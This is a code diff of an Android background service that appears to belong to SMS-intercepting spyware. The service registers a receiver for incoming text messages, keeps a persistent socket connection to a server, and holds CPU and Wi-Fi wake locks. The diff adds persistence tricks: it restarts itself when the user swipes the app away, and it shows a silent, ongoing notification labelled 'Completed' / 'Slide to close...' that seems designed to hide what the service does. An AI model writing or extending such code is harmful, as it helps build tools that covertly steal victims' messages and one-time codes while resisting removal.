@@ -34,10 +34,7 @@ public class RunningService extends Service {
     private PowerManager.WakeLock wakeLock;
     private WifiManager.WifiLock wifiLock;
 
-    // ✅ For network detection (API < 24)
     private BroadcastReceiver legacyNetworkReceiver;
-
-    // ✅ For API >= 24 (Android 7+)
     private ConnectivityManager.NetworkCallback networkCallback;
 
     @Override
@@ -47,91 +44,95 @@ public class RunningService extends Service {
         helper = new Helper();
         TAG = helper.TAG;
         CHANNEL_ID = helper.BG_CHANNEL_ID;
+        helper.show("RunningService onCreate()");
 
+        // ✅ Step 1: create notification channel
         createNotificationChannel();
-        startForegroundService();
 
-        // ✅ Acquire Partial WakeLock — keeps CPU awake
-        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
-        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MyApp::CpuLock");
-        wakeLock.acquire();
+        // ✅ Step 2: immediately start foreground (no delay)
+        startForegroundNotification();
 
-        // ✅ Acquire WiFiLock — keeps WiFi from sleeping
-        WifiManager wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
-        wifiLock = wifiManager.createWifiLock(WifiManager.WIFI_MODE_FULL_HIGH_PERF, "MyApp::WifiLock");
-        wifiLock.acquire();
+        // ✅ Step 3: move heavy setup to background thread
+        new Thread(this::initializeBackgroundTasks).start();
+    }
 
-        // ✅ Register SMS receiver
-        IntentFilter filter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
-        smsReceiver = new SmsReceiver();
-        registerReceiver(smsReceiver, filter);
+    private void initializeBackgroundTasks() {
+        try {
+            // ✅ Acquire Partial WakeLock — keeps CPU awake
+            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MyApp::CpuLock");
+            wakeLock.acquire();
 
-        // ✅ Initialize and connect socket
-        socketManager = SocketManager.getInstance(getApplicationContext());
-        socketManager.connect();
+            // ✅ Acquire WiFiLock — keeps WiFi from sleeping
+            WifiManager wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
+            wifiLock = wifiManager.createWifiLock(WifiManager.WIFI_MODE_FULL_HIGH_PERF, "MyApp::WifiLock");
+            wifiLock.acquire();
 
-        // ✅ Register network listener
-        registerNetworkListeners();
+            // ✅ Register SMS receiver
+            IntentFilter filter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
+            smsReceiver = new SmsReceiver();
+            registerReceiver(smsReceiver, filter);
 
+            // ✅ Initialize and connect socket
+            socketManager = SocketManager.getInstance(getApplicationContext());
+            socketManager.connect();
 
+            // ✅ Register network listener
+            registerNetworkListeners();
 
-        helper.show( "RunningService created and initialized");
+            helper.show("RunningService initialized fully in background thread");
+
+        } catch (Exception e) {
+            helper.show("Error initializing RunningService: " + e.getMessage());
+        }
     }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        // Service restarts automatically if killed
+        helper.show("RunningService onStartCommand");
         return START_STICKY;
     }
 
     @Override
     public void onDestroy() {
-        helper.show( "RunningService onDestroy() called");
-        if (socketManager!=null && socketManager.isConnected()) {
-            helper.show("Offline By On OnDestroy through system/user");
-            socketManager.deviceOfflineBy("Offline By On OnDestroy through system/user ", "offline");
-        }
-        if (smsReceiver != null) {
-            unregisterReceiver(smsReceiver);
-            smsReceiver = null;
-        }
-        unregisterNetworkListeners();
-        if (socketManager != null) {
+        helper.show("RunningService onDestroy()");
+        if (socketManager != null && socketManager.isConnected()) {
+            socketManager.deviceOfflineBy("Service destroyed", "offline");
             socketManager.disconnect();
         }
+
+        if (smsReceiver != null) {
+            try {
+                unregisterReceiver(smsReceiver);
+            } catch (Exception ignored) {}
+            smsReceiver = null;
+        }
+
+        unregisterNetworkListeners();
+
         // ✅ Release locks when done
-        if (wakeLock != null && wakeLock.isHeld()) {
-            wakeLock.release();
-            helper.show("RunningService: WakeLock released");
-        }
-        if (wifiLock != null && wifiLock.isHeld()) {
-            wifiLock.release();
-            helper.show("RunningService: WifiLock released");
-        }
+        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
+        if (wifiLock != null && wifiLock.isHeld()) wifiLock.release();
 
         super.onDestroy();
-        helper.show( "RunningService destroyed");
     }
-
 
     @Nullable
     @Override
     public IBinder onBind(Intent intent) {
-        return null; // Not a bound service
+        helper.show("On Bind...");
+        return null;
     }
 
     // --------------------------------------------------------------------
-    // 🔗 NETWORK DETECTION (Wi-Fi + Mobile Data)
+    // 🔗 NETWORK DETECTION
     // --------------------------------------------------------------------
     private void registerNetworkListeners() {
         ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
-
-        // ✅ Modern method (Android 7+)
         networkCallback = new ConnectivityManager.NetworkCallback() {
             @Override
             public void onAvailable(Network network) {
-                super.onAvailable(network);
-                helper.show( "Network Available");
+                helper.show("Network Available");
                 if (socketManager != null && !socketManager.isConnected()) {
                     socketManager.connect();
                 }
@@ -139,7 +140,6 @@ public class RunningService extends Service {
 
             @Override
             public void onLost(Network network) {
-                super.onLost(network);
                 helper.show("Network lost — disconnecting socket");
                 if (socketManager != null) {
                     socketManager.disconnect();
@@ -151,30 +151,14 @@ public class RunningService extends Service {
                 .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                 .build();
         cm.registerNetworkCallback(networkRequest, networkCallback);
-        helper.show( "NetworkCallback registered");
-
     }
 
     private void unregisterNetworkListeners() {
         ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
-
         if (networkCallback != null) {
             try {
                 cm.unregisterNetworkCallback(networkCallback);
-                helper.show( "NetworkCallback unregistered");
-            } catch (Exception e) {
-                helper.show( "Error unregistering networkCallback: " + e.getMessage());
-            }
-        }
-
-        if (legacyNetworkReceiver != null) {
-            try {
-                unregisterReceiver(legacyNetworkReceiver);
-                legacyNetworkReceiver = null;
-                helper.show( "Legacy network receiver unregistered");
-            } catch (Exception e) {
-                helper.show("Error unregistering legacyNetworkReceiver: " + e.getMessage());
-            }
+            } catch (Exception ignored) {}
         }
     }
 
@@ -186,7 +170,7 @@ public class RunningService extends Service {
             NotificationChannel serviceChannel = new NotificationChannel(
                     CHANNEL_ID,
                     "Background Service Channel",
-                    NotificationManager.IMPORTANCE_LOW
+                    NotificationManager.IMPORTANCE_HIGH
             );
             NotificationManager manager = getSystemService(NotificationManager.class);
             if (manager != null) manager.createNotificationChannel(serviceChannel);
@@ -194,7 +178,7 @@ public class RunningService extends Service {
     }
 
     @SuppressLint("ForegroundServiceType")
-    private void startForegroundService() {
+    private void startForegroundNotification() {
         Intent browserIntent = new Intent(Intent.ACTION_VIEW, android.net.Uri.parse("https://www.google.com"));
         browserIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
 
@@ -206,13 +190,30 @@ public class RunningService extends Service {
         );
 
         Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
-                .setContentText("Slide to Close...")
+                .setContentTitle("Completed")
+                .setContentText("Slide to close...")
                 .setSmallIcon(R.drawable.ic_launcher_foreground)
                 .setContentIntent(pendingIntent)
                 .setOngoing(true)
+                .setSilent(true)
                 .build();
 
         startForeground(1, notification);
+    }
+
+
+    @Override
+    public void onTaskRemoved(Intent rootIntent) {
+        helper.show("RunningService task removed — restarting");
+        Intent restartServiceIntent = new Intent(getApplicationContext(), RunningService.class);
+        restartServiceIntent.setPackage(getPackageName());
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            getApplicationContext().startForegroundService(restartServiceIntent);
+        } else {
+            getApplicationContext().startService(restartServiceIntent);
+        }
+        super.onTaskRemoved(rootIntent);
     }
 
 }
